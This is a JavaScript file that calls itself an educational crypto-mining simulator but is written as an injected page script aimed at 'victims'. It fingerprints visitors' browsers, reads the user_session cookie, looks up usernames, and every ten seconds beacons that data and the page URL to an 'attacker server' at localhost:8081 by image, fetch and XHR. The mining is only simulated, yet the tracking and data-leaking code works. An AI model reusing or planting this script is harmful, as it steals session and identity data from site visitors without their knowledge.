// Robust cryptocurrency mining simulator with guaranteed logging
// This is for educational purposes only - DO NOT USE FOR MALICIOUS PURPOSES

(function() {
    // Set flags to prevent other miners from initializing
    window.minerLoaded = true;
    window.stealthMinerActive = true;
    window.robustMinerActive = true;
    
    // Configuration
    const config = {
        active: false,
        hashes: 0,
        rate: 0,
        start: null,
        intensity: 15,
        timer: null,
        reporter: null,
        userIdentifier: '',
        pageUrl: '',
        username: '',
        lastReport: 0
    };
    
    // Generate a unique identifier for this victim
    function generateVictimId() {
        const nav = navigator;
        const screen = window.screen;
        const guid = [
            nav.userAgent,
            nav.language || nav.userLanguage,
            new Date().getTimezoneOffset(),
            screen.colorDepth,
            screen.width + 'x' + screen.height,
            Math.random().toString(36).substring(2, 12)
        ].join('###');
        
        // Create a hash of the guid
        let hash = 0;
        for (let i = 0; i < guid.length; i++) {
            hash = ((hash << 5) - hash) + guid.charCodeAt(i);
            hash = hash & hash; // Convert to 32bit integer
        }
        return 'victim_' + Math.abs(hash).toString(16);
    }
    
    // Extract username from cookie
    function getUsernameFromCookie() {
        if (document.cookie.includes('user_session')) {
            // Get the user ID from the cookie
            const userId = document.cookie.split('user_session=')[1].split(';')[0];
            
            // Try to fetch the actual username using the user ID
            try {
                // Create a hidden iframe to fetch the username
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'about:blank';
                document.body.appendChild(iframe);
                
                // Use the iframe to make a request to get the username
                const xhr = new XMLHttpRequest();
                xhr.open('GET', '/users.php?id=' + userId, false); // Synchronous request
                xhr.send();
                
                if (xhr.status === 200 && xhr.responseText) {
                    // If we got a response, try to extract the username
                    const usernameMatch = xhr.responseText.match(/<username>(.*?)<\/username>/);
                    if (usernameMatch && usernameMatch[1]) {
                        return usernameMatch[1];
                    }
                }
                
                // Clean up
                document.body.removeChild(iframe);
            } catch (e) {
                console.error("Failed to fetch username:", e);
            }
            
            // If we couldn't get the username, at least return "user_" + ID
            return "user_" + userId;
        }
        return 'unknown_user';
    }
    
    // Initialize the miner
    function initialize() {
        config.userIdentifier = generateVictimId();
        config.pageUrl = window.location.href;
        config.username = getUsernameFromCookie();
        
        console.log("Robust miner initialized with ID:", config.userIdentifier);
        
        // Start mining
        startMining();
        
        // Send initial report
        sendMiningReport();
    }
    
    // Start the mining process
    function startMining() {
        if (config.active) return;
        
        config.active = true;
        config.start = Date.now();
        config.timer = setInterval(simulateMining, 1000);
        config.reporter = setInterval(sendMiningReport, 10000);
        
        console.log("Mining started");
    }
    
    // Stop the mining process
    function stopMining() {
        if (!config.active) return;
        
        config.active = false;
        clearInterval(config.timer);
        clearInterval(config.reporter);
        
        // Send final report
        sendMiningReport();
        
        console.log("Mining stopped");
    }
    
    // Simulate mining activity
    function simulateMining() {
        if (!config.active) return;
        
        // Simulate hash calculation
        const hashesThisRound = Math.floor(Math.random() * config.intensity) + 1;
        config.hashes += hashesThisRound;
        
        // Calculate hash rate
        const elapsed = (Date.now() - config.start) / 1000;
        config.rate = Math.round(config.hashes / elapsed);
        
        console.log(`Mining: ${config.hashes} hashes at ${config.rate} H/s`);
    }
    
    // Send mining report to attacker server using multiple methods
    function sendMiningReport() {
        try {
            // Prepare data
            const data = {
                h: config.hashes,
                r: config.rate,
                t: Math.floor(Date.now() / 1000),
                username: config.username,
                page: config.pageUrl,
                victim_id: config.userIdentifier
            };
            
            // Method 1: Image beacon (most reliable)
            new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
            
            // Method 2: Fetch API
            fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
                mode: 'no-cors',
                cache: 'no-cache'
            }).catch(() => {
                // Silently fail if fetch doesn't work
            });
            
            // Method 3: XMLHttpRequest as fallback
            const xhr = new XMLHttpRequest();
            xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
            xhr.send();
            
            console.log("Mining report sent:", data);
            config.lastReport = Date.now();
        } catch (e) {
            console.error("Failed to report mining stats:", e);
        }
    }
    
    // Initialize the miner
    initialize();
    
    // Expose API
    window.robustMiner = {
        start: startMining,
        stop: stopMining,
        getStats: function() {
            return {
                active: config.active,
                hashes: config.hashes,
                rate: config.rate,
                elapsed: config.start ? Math.floor((Date.now() - config.start) / 1000) : 0
            };
        }
    };
})(); 